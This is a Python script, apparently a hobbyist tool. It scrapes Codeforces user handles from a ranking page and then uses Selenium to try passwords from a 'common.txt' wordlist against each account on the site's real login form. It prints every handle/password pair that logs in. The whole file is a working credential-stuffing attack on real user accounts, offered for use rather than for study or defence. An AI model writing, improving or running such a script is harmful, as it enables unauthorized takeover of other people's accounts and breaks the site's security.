from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
import urllib

browser = webdriver.Firefox()

A = open('common.txt', 'r')
common = A.readlines()
url = ''	# place the page url
r = urllib.urlopen(url).read()
soup = BeautifulSoup(r, 'html.parser')
users = []
users += soup.find_all("a", class_="rated-user user-legendary")
users += soup.find_all("a", class_="rated-user user-red")
users += soup.find_all("a", class_="rated-user user-orange")
users += soup.find_all("a", class_="rated-user user-violet")
users += soup.find_all("a", class_="rated-user user-blue")
users += soup.find_all("a", class_="rated-user user-cyan")
users += soup.find_all("a", class_="rated-user user-green")
users += soup.find_all("a", class_="rated-user user-gray")
users += soup.find_all("a", class_="rated-user user-black")

for element in users:
	ss=element.get_text()
	ss = str (ss)
	ss +='\n'
	for password in common:
        	browser.get('https://codeforces.com/enter')
    		userElem =  browser.find_element_by_id('handleOrEmail')
    		userElem.send_keys(ss) 		 # handle here
		passwordElem =  browser.find_element_by_id('password')
 		passwordElem.send_keys(password) # password here
   		loginElem = browser.find_element_by_class_name('submit')
   	 	loginElem.click()
		try:
			logoutElem=browser.find_element_by_link_text('Logout')
			logoutElem.click()	
			EnterElem=browser.find_element_by_link_text('Enter')
			EnterElem.click()
			print(ss, password)
	   		break
		except:
	   		continue
print ("done")

